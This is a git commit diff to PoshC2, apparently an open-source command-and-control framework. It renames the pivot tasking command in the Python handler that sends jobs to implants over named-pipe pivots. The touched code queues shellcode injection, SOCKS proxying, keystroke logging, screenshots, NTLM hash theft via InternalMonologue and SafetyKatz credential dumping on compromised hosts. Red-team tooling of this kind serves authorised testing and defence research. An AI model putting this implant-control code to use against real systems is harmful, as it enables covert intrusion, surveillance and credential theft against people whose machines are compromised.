3436ed1dfe9066a46aaa7b688aa88d1ca85b251d
benpturner <2518196+benpturner@users.noreply.github.com>
2020-12-15 22:04:44 +0000

    Added Multiple Pivoting Capability in SharpPBind

--- poshc2/client/command_handlers/PbindPivotHandler.py
+++ poshc2/client/command_handlers/PbindPivotHandler.py
@@ -17,7 +17,7 @@ from poshc2.server.database.DB import new_task, unhide_implant, kill_implant, ge
 from poshc2.server.database.DB import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
 
 
-def handle_pbind_command(command, user, randomuri, implant_id):
+def handle_pbind_pivot_command(command, user, randomuri, implant_id):
 
     # convert randomuri to parent randomuri
     oldrandomuri = randomuri
@@ -81,7 +81,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             print("")
             print("Uploading %s to %s" % (source, destination))
             uploadcommand = f"upload-file {source} {destination}"
-            new_task(f"pbind-command {uploadcommand}", user, randomuri)
+            new_task(f"pbind-pivot-command {uploadcommand}", user, randomuri)
         except Exception as e:
             print_bad("Error with source file: %s" % e)
             traceback.print_exc()
@@ -107,7 +107,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         try:
             shellcodefile = load_file(path)
             if shellcodefile is not None:
-                new_task("pbind-command run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
+                new_task("pbind-pivot-command run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
         except Exception as e:
             print("Error loading file: %s" % e)
 
@@ -141,21 +141,21 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         if ri.lower() == "n":
             print("")
         if ri == "":
-            new_task("pbind-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
+            new_task("pbind-pivot-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
         if ri.lower() == "y":
-            new_task("pbind-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
+            new_task("pbind-pivot-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
 
     elif (command.startswith("stop-keystrokes")):
-        new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
         update_label("", randomuri)
 
     elif (command.startswith("start-keystrokes")):
         check_module_loaded("Logger.exe", oldrandomuri, user)
-        new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
         update_label("KEYLOG", randomuri)
 
     elif (command.startswith("get-keystrokes")):
-        new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
 
     elif (command.startswith("get-screenshotmulti")):
         pwrStatus = get_powerstatusbyrandomuri(randomuri)
@@ -163,7 +163,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
             if ri.lower() == "n" or ri.lower() == "":
                 return
-        new_task(f"pbind-command {command}", user, randomuri)
+        new_task(f"pbind-pivot-command {command}", user, randomuri)
         update_label("SCREENSHOT", randomuri)
 
     elif (command.startswith("get-screenshot")):
@@ -172,22 +172,22 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
             if ri.lower() == "n" or ri.lower() == "":
                 return
-        new_task(f"pbind-command {command}", user, randomuri)
+        new_task(f"pbind-pivot-command {command}", user, randomuri)
 
     elif (command == "get-powerstatus"):
         getpowerstatus(randomuri)
-        new_task("pbind-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
+        new_task("pbind-pivot-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
 
     elif (command == "getpowerstatus"):
         getpowerstatus(randomuri)
-        new_task("pbind-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
+        new_task("pbind-pivot-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)
 
     elif (command.startswith("stop-powerstatus")):
-        new_task(f"pbind-command {command}", user, randomuri)
+        new_task(f"pbind-pivot-command {command}", user, randomuri)
         update_label("", randomuri)
 
     elif (command.startswith("stoppowerstatus")):
-        new_task(f"pbind-command {command}", user, randomuri)
+        new_task(f"pbind-pivot-command {command}", user, randomuri)
         update_label("", randomuri)
 
     elif (command.startswith("pslo")):
@@ -204,26 +204,26 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         if os.path.isfile(path):
             with open(path, "r") as p:
                 payload = p.read()
-            new_task("pbind-command %s payload=%s" % (command,payload), user, randomuri)
+            new_task("pbind-pivot-command %s payload=%s" % (command,payload), user, randomuri)
         else:
             print_bad("Could not find file")
 
     elif (command.startswith("get-hash")):
         check_module_loaded("InternalMonologue.exe", oldrandomuri, user)
-        new_task("pbind-command run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
+        new_task("pbind-pivot-command run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
 
     elif (command.startswith("safetykatz")):
-        new_task("pbind-command run-exe SafetyKatz.Program %s" % command, user, randomuri)
+        new_task("pbind-pivot-command run-exe SafetyKatz.Program %s" % command, user, randomuri)
 
     elif command.startswith("loadmoduleforce"):
         params = re.compile("loadmoduleforce ", re.IGNORECASE)
         params = params.sub("", command)
-        new_task("pbind-loadmodule %s" % params, user, randomuri)
+        new_task("pbind-pivot-loadmodule %s" % params, user, randomuri)
 
     elif command.startswith("loadmodule"):
         params = re.compile("loadmodule ", re.IGNORECASE)
         params = params.sub("", command)
-        new_task("pbind-loadmodule %s" % params, user, randomuri)
+        new_task("pbind-pivot-loadmodule %s" % params, user, randomuri)
 
     elif command.startswith("listmodules"):
         modules = os.listdir("%s/Modules/" % PoshInstallDirectory)
@@ -238,7 +238,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
     elif command.startswith("modulesloaded"):
         ml = get_implantdetails(oldrandomuri)
         print(ml.ModsLoaded)
-        new_task("pbind-command listmodules", user, randomuri)
+        new_task("pbind-pivot-command listmodules", user, randomuri)
 
     elif command == "help" or command == "?":
         print(sharp_help)
@@ -255,11 +255,11 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
             print(Colours.GREEN)
         else:
-            new_task(f"pbind-command {command}", user, randomuri)
+            new_task(f"pbind-pivot-command {command}", user, randomuri)
 
     else:
         if command:
-            new_task(f"pbind-command {original_command}", user, randomuri)
+            new_task(f"pbind-pivot-command {original_command}", user, randomuri)
         return
 
 
@@ -273,12 +273,12 @@ def do_pbind_start(user, command, randomuri):
         print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
         return
     
-    if command.startswith("pbind-command "):
-        command = command.replace("pbind-command ", "pbind-command run-exe PBind PBind ")
+    if command.startswith("pbind-pivot-command "):
+        command = command.replace("pbind-pivot-command ", "pbind-pivot-command run-exe PBind PBind ")
     elif command.startswith("pbind-connect"):
-        command = command.replace("pbind-connect ", "pbind-command run-exe PBind PBind start ")
+        command = command.replace("pbind-connect ", "pbind-pivot-command run-exe PBind PBind start ")
     elif command.startswith("pbind-kill"):
-        command = command.replace("pbind-kill", "pbind-command run-exe PBind PBind kill-implant")
+        command = command.replace("pbind-kill", "pbind-pivot-command run-exe PBind PBind kill-implant")
 
     new_task(command, user, randomuri)
 
